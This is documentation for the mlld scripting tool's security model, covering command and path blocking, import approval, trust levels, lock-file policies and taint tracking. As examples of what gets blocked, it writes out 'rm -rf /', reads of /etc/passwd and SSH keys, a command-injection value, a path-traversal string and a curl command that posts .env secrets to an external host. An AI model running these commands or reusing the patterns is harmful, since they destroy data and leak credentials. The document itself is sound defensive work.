# mlld Security Model

mlld implements a comprehensive security model that protects users from malicious code while maintaining ease of use. This document explains the security features and how to configure them.

## Core Security Principles

### 1. Progressive Trust
Start restrictive and allow gradual expansion of trust. Every new operation requires approval until you explicitly trust it.

### 2. Content Addressing
All imported content is verified by SHA-256 hash, preventing tampering or substitution attacks.

### 3. Offline-First
Security checks work without internet connectivity. All policies are stored locally.

### 4. Least Privilege
mlld only requests the minimum permissions needed for each operation.

## Security Features

### Command Execution Protection

mlld analyzes all commands before execution:

```mlld
@run [(rm -rf /)]  # Blocked by default - dangerous pattern detected
@run [(npm test)]  # Allowed after approval - common safe command
```

Commands are categorized by risk:
- **Safe**: Common development commands (npm test, git status)
- **Moderate**: Commands that modify files (npm install, git commit)
- **Dangerous**: Commands with destructive potential (rm -rf, sudo)

### Import Security

All imports require approval before first use:

```
🔒 Import approval required:
Source: https://example.com/template.mld

Content preview:
---
@text greeting = "Hello world"
@run [(echo "Running commands")]
---

Approve this import? [y/N]
```

Once approved, imports are cached locally by content hash.

### Path Protection

File system access is restricted:

```mlld
@path file = [/etc/passwd]        # Blocked - system directory
@path data = [~/.ssh/id_rsa]      # Blocked - sensitive file
@path config = [./config.json]    # Allowed - project file
```

### URL Validation

Network requests are controlled:

```mlld
@import { x } from "https://trusted.com/module.mld"  # HTTPS required
@import { x } from "http://insecure.com/module.mld"  # Warning shown
```

## Trust Levels

Control security verification with trust levels:

```mlld
# Always trust (skip all checks)
@import { tool } from @company/internal <trust always>
@run [(deploy.sh)] <trust always>

# Verify (prompt for approval) - default
@import { util } from @community/package <trust verify>
@run [(new-script.sh)] <trust verify>

# Never trust (always block)
@import { danger } from @sketchy/module <trust never>
@run [(suspicious-command)] <trust never>
```

## Resolver Security

The resolver system provides additional security through sandboxing:

### Sandbox Without File System Access

By controlling which resolvers are available, you can sandbox mlld completely:

```json
{
  "registries": [
    {
      "prefix": "@data/",
      "resolver": "http",
      "config": {
        "baseUrl": "https://api.company.com/mlld-data"
      }
    }
  ],
  "security": {
    "allowNewResolvers": false,
    "allowedResolvers": ["http"]
  }
}
```

This configuration:
- Only allows HTTP resolver (no local file access)
- Prevents adding new resolvers
- Limits data access to approved APIs

### Enterprise Control

IT departments can set global policies in `~/.mlld/mlld.lock.json`:

```json
{
  "security": {
    "policies": {
      "commands": {
        "default": "verify",
        "blocked": ["rm -rf", "sudo", "curl"],
        "allowed": ["npm", "git"]
      },
      "resolvers": {
        "allowed": ["local", "github"],
        "blocked": ["http"],
        "allowNewResolvers": false
      },
      "imports": {
        "allowedDomains": ["github.com", "company.com"],
        "blockedDomains": ["sketchy.com"],
        "requireHTTPS": true
      }
    }
  }
}
```

## Lock File Security

The `mlld.lock.json` file serves as the security policy and audit trail:

### Global Lock File (`~/.mlld/mlld.lock.json`)
- User-wide security policies
- Cannot be overridden by project files
- Managed by user or IT department

### Project Lock File (`./mlld.lock.json`)
- Project-specific approvals
- Module dependencies and hashes
- Additional restrictions (cannot loosen global)

### Security Precedence

For security policies, the most restrictive setting wins:
```
Global Block > Project Block > Global Allow > Project Allow > Default
```

For performance settings (TTL), the most specific setting wins:
```
Inline Setting > Project Setting > Global Setting > Default
```

## Taint Tracking

mlld tracks the origin of all data:

```mlld
@import { userData } from "https://api.com/data"  # Tainted: NETWORK
@text processed = @userData                       # Tainted: inherited
@run [(echo {{processed}})]                        # Warning: tainted data in command
```

Taint levels:
- `TRUSTED`: Your local files
- `FILE_SYSTEM`: Other local files
- `NETWORK`: Data from URLs
- `USER_INPUT`: Interactive input
- `LLM_OUTPUT`: AI-generated content
- `COMMAND_OUTPUT`: Command results

## Configuration

### Basic Security Config

```json
{
  "security": {
    "commands": {
      "analyze": true,
      "requireApproval": true,
      "logCommands": true
    },
    "imports": {
      "requireApproval": true,
      "cacheApprovals": true,
      "verifyHashes": true
    },
    "paths": {
      "restrictToProject": true,
      "allowSymlinks": false
    }
  }
}
```

### Advanced Resolver Security

```json
{
  "registries": [
    {
      "prefix": "@approved/",
      "resolver": "github",
      "config": {
        "owner": "company",
        "repo": "approved-modules"
      }
    }
  ],
  "security": {
    "resolvers": {
      "allowNewResolvers": false,
      "trustedResolvers": {
        "@approved/": "always",
        "@public/": "verify"
      }
    }
  }
}
```

## Module Resolution Security

### Public Modules
When importing from the public registry:

```mlld
@import { helper } from @alice/utils
```

Resolution flow:
1. Check `alice-utils.public.mlld.ai` DNS record
2. Fetch from GitHub/GitLab/Gist URL
3. Verify content hash
4. Cache locally

The `.public.` domain makes it clear these are publicly accessible modules.

### Private Modules
Configure private resolvers for internal code:

```mlld
# Configure in lock file
{
  "registries": [{
    "prefix": "@internal/",
    "resolver": "github",
    "config": {
      "owner": "company",
      "repo": "private-modules",
      "token": "${GITHUB_TOKEN}"
    }
  }]
}

# Use in scripts
@import { tool } from @internal/deploy-tools
```

## Common Scenarios

### Personal Use
- Default settings work well
- Approve imports as needed
- Trust your own modules

### Team Environment
- Share project lock files
- Set up team resolver for shared modules
- Document trust decisions

### Enterprise Deployment
- IT sets global policies
- Approved module repositories
- Audit trail of all operations
- Resolver restrictions for sandboxing

## Security Best Practices

1. **Review imports carefully** - Check what commands they run
2. **Use specific trust** - Don't blindly trust always
3. **Lock dependencies** - Commit lock files to version control
4. **Limit resolver access** - Only add resolvers you need
5. **Regular updates** - Keep mlld and modules updated
6. **Audit regularly** - Review security logs and approvals

## Preventing Common Attacks

### Command Injection
```mlld
# Dangerous - user input in command
@text userInput = "file.txt; rm -rf /"
@run [(cat {{userInput}})]  # Blocked - injection detected

# Safe - validated input
@text filename = "file.txt"
@if @filename matches /^[\w.-]+$/
  @run [(cat {{filename}})]
@end
```

### Path Traversal
```mlld
# Dangerous - user controls path
@text userPath = "../../../etc/passwd"
@path file = [{{userPath}}]  # Blocked - traversal detected

# Safe - restricted to project
@text name = "config"
@path file = [./data/{{name}}.json]
```

### Data Exfiltration
```mlld
# Suspicious - sending local data externally
@text secrets = [./.env]
@run [(curl -X POST https://external.com -d {{secrets}})]  # Warning shown
```

## Troubleshooting

### "Operation blocked by security policy"
Check global and project policies. Use `--verbose` to see which policy blocked it.

### "Import not approved"
The import needs approval. Run interactively or add to lock file.

### "Cannot add resolver"
Global policy may prevent new resolvers. Check with IT or system admin.

### "Command requires approval"
The command was flagged as risky. Review and approve if safe.

## Security CLI Commands

### Check Security Status
```bash
mlld security status

Security Configuration:
✓ Command analysis: ENABLED
✓ Import verification: ENABLED  
✓ Path protection: ENABLED
✓ Taint tracking: ENABLED

Resolvers:
  @notes/ → local (~/Documents/Notes)
  @work/ → github (company/modules)
  @alice/ → public registry

Recent blocks:
  2024-01-25 10:30 - Blocked: rm -rf /
  2024-01-25 09:15 - Blocked: /etc/passwd access
```

### Test Security
```bash
mlld security test script.mld

Security Analysis:
- 3 imports (2 approved, 1 new)
- 5 commands (4 safe, 1 moderate)
- 2 file accesses (all safe)
- No suspicious patterns detected

Run with --dry-run to test without execution
```

## Summary

mlld's security model provides defense in depth:

1. **Command Analysis** - Blocks dangerous commands
2. **Import Verification** - Content addressing prevents tampering
3. **Path Protection** - Restricts file system access
4. **Resolver Control** - Sandbox via limited data sources
5. **Trust Levels** - Explicit control over verification
6. **Policy Hierarchy** - Enterprise control with local flexibility

Security is progressive - start safe, build trust gradually, maintain control.